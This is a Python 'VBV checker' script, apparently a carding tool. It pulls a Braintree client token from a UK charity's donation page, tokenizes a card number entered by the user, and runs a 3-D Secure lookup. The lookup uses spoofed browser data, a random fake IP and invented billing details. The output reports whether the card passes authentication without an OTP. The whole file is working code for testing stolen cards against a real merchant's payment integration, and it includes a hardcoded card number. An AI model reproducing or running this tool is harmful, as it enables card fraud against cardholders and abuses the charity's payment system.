#>_ Braintree | 3DS2 // VBV Checker
#>_ cllsupport.org.uk $1.00 // @diwazz
import requests, time, json, re, base64, random, string
from datetime import datetime
from faker import Faker
fake = Faker()
SITE_URL = "https://cllsupport.org.uk"
DONATE_URL = f"{SITE_URL}/donate/"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
BRAINTREE_API = "https://api.braintreegateway.com"
HEADERS = {
    "User-Agent": fake.user_agent(),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-GB,en;q=0.9",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache",
}
CARD = {"number": "4496130001514478", "expiry": "08/26", "cvv": "123"}
STATUS_MAP = {
    "authenticate_successful": "Passed",
    "authenticate_attempt_successful": "Passed",
    "challenge_required": "OTP Required",
    "authenticate_frictionless_failed": "OTP Required",
    "lookup_card_error": "OTP Required",
    "authenticate_rejected": "OTP Required",
    "lookup_error": "Error",
    "authenticate_unavailable": "OTP Required",
    "authenticate_error": "Error",
    "no_response": "Failed",
}
def detect_brand(cc):
    if cc.startswith("4"): return "VISA"
    if cc.startswith("5"): return "MASTERCARD"
    if cc.startswith("3"): return "AMEX"
    return "DISCOVER"
def extract_auth(session):
    for attempt in range(5):
        try:
            r = session.get(DONATE_URL, timeout=20)
            if 'clientToken' not in r.text and attempt > 0:
                session.cookies.clear()
                time.sleep(3)
                continue
            
            m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
            if not m: m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
            if not m:
                auth_m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', r.text)
                merch_m = re.search(r'"merchantId"\s*:\s*"([^"]+)"', r.text)
                if auth_m:
                    auth = auth_m.group(1)
                    merch = merch_m.group(1) if merch_m else "dyb5fmjx5t5wxckj"
                    return auth, merch
            
            if m:
                decoded = base64.b64decode(m.group(1)).decode("utf-8")
                data = json.loads(decoded)
                auth = data.get("authorizationFingerprint", "")
                merch = data.get("merchantId", "")
                if auth and merch: return auth, merch
        except Exception as e:
            pass
        time.sleep(2)
    return None, None
def tokenize_card(session, auth):
    month, year = CARD["expiry"].split("/")
    if len(year) == 2: year = "20" + year
    query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
        tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
    }"""
    variables = {"input": {"creditCard": {"number": CARD["number"], "expirationMonth": month, "expirationYear": year, "cvv": CARD["cvv"]}, "options": {"validate": False}}}
    h = {**HEADERS, "Authorization": f"Bearer {auth}", "Braintree-Version": "2018-05-10", "Content-Type": "application/json"}
    body = {"clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(fake.uuid4())}, "query": query, "variables": variables, "operationName": "TokenizeCreditCard"}
    resp = session.post(BRAINTREE_GRAPHQL, headers=h, json=body)
    data = resp.json()
    if "errors" in data: return None, None, None
    token = data["data"]["tokenizeCreditCard"]["token"]
    cc = data["data"]["tokenizeCreditCard"]["creditCard"]
    return token, cc.get("last4", ""), cc.get("brandCode", "VISA")
def lookup_3ds(session, auth, merch, token):
    url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    payload = {
        "amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False,
        "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
        "browserScreenHeight": 800, "browserScreenWidth": 360,
        "browserTimeZone": -345, "deviceChannel": "Browser",
        "additionalInfo": {"ipAddress": fake.ipv4(), "billingLine1": "New York", "billingCity": "New York", "billingState": "NY", "billingPostalCode": "10080", "billingCountryCode": "US", "billingPhoneNumber": "998773772", "billingGivenName": "diwas", "billingSurname": "Py", "email": "diwasPy@gmail.com"},
        "bin": CARD["number"][:6], "dfReferenceId": f"0_{fake.uuid4()}",
        "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1", "cardinalDeviceDataCollectionTimeElapsed": random.randint(400, 2000), "issuerDeviceDataCollectionTimeElapsed": random.randint(800, 5000), "issuerDeviceDataCollectionResult": True},
        "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
        "_meta": {"merchantAppId": "cllsupport.org.uk", "platform": "web", "sdkVersion": "3.115.1", "source": "client", "integration": "custom", "integrationType": "custom", "sessionId": str(fake.uuid4())},
    }
    resp = session.post(url, headers={**HEADERS, "Content-Type": "application/json"}, json=payload, timeout=45)
    if resp.status_code in [200, 201] and resp.text.strip(): return resp.json()
    return {}
def parse_status(lookup):
    try: return lookup["paymentMethod"]["threeDSecureInfo"]["status"]
    except:
        lookup_str = json.dumps(lookup)
        for code in STATUS_MAP:
            if code in lookup_str: return code
    return "no_response"
def get_enrolled_info(lookup, result_code):
    enrolled_raw = None
    try: enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
    except: pass
    if enrolled_raw == "Y": return "ENROLLED", "Y"
    elif enrolled_raw == "N": return "NOT_ENROLLED", "N"
    elif enrolled_raw == "U": return "UNKNOWN", "U"
    enrolled_map = {"authenticate_successful": "ENROLLED", "authenticate_attempt_successful": "ENROLLED", "challenge_required": "ENROLLED", "authenticate_frictionless_failed": "ENROLLED", "lookup_card_error": "NOT_ENROLLED", "authenticate_rejected": "NOT_ENROLLED", "lookup_error": "NOT_ENROLLED", "authenticate_unavailable": "NOT_ENROLLED", "authenticate_error": "NOT_ENROLLED", "no_response": "UNKNOWN"}
    return enrolled_map.get(result_code, "UNKNOWN"), enrolled_raw or "-"

print(f">_ {SITE_URL} $1.00 // @diwazz")
print(f">_ Site : {SITE_URL}")
print(">_ " + "-" * 32)
print(">_ Format: CARD|MM|YY|CVV")
ci = input(">_ Card: ").strip()
if ci:
    p = ci.split("|")
    if len(p) >= 4:
        CARD["number"] = p[0].strip().replace(" ", "").replace("-", "")
        mm = p[1].strip().zfill(2)
        yy = p[2].strip()
        if len(yy) == 2: yy = "20" + yy
        CARD["expiry"] = f"{mm}/{yy[-2:]}"
        CARD["cvv"] = p[3].strip()

brand = detect_brand(CARD["number"])
t0 = time.time()
print(f">_ Card: {CARD['number']}|{CARD['expiry']}|{CARD['cvv']}")
print(">_ " + "-" * 32)
print(">_ [π] Processing...")

s = requests.Session()
s.headers.update(HEADERS)
s.cookies.set("cookie_test", "please_accept_for_session")
s.cookies.set("civicAllowCookies", "yes")

auth, merch = extract_auth(s)
if not auth: print(">_ [x] Auth failed after 5 retries"); exit()
token, last4, brand_code = tokenize_card(s, auth)
if not token: print(">_ [x] Token failed"); exit()
brand = brand_code or brand
lookup = lookup_3ds(s, auth, merch, token)
result_code = parse_status(lookup)
status = STATUS_MAP.get(result_code, "Unknown")
enrolled_status, enrolled_flag = get_enrolled_info(lookup, result_code)

print(">_ " + "-" * 32)
print(f">_ Status  : {status}")
print(f">_ Enrolled: {enrolled_status} (enrolled={enrolled_flag})")
print(f">_ Code    : {result_code}")
print(f">_ Card    : {brand} - {last4}")
print(f">_ Time    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f">_ Taken   : {time.time()-t0:.2f}s")
print(">_ " + "-" * 32)